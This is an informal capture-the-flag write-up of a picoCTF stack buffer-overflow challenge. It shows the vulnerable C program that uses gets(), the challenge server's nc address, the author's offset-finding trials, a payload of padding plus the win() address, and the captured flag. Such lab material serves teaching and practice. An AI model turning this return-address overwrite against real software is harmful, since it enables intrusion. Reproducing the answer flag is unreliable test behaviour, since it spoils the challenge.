AUTHOR: SANJAY C / PALASH OSWAL

Description
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.
You can view source here. And connect with it using nc saturn.picoctf.net 61692

code:

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}



Please enter your string:
1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34
Okay, time to return... Fingers Crossed... Jumping to 0x2c39312c



								   └─$ nc saturn.picoctf.net 51498
Please enter your string:
2,331,1,2,3,1,3
Okay, time to return... Fingers Crossed... Jumping to 0x804932f

0x08040043
0x080491f6 - memory of win function

ok, it was the hardest one Ive found, spent around 1.5h

we need to buffer overflow it, if we paste alphabet twice we get address
0x76757473
which means "stuv", so we need to put it backwards, and change it into win, to run the function

need to replace it with abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqr\xf6\x91\x04\x08

then we can get the falg

picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}

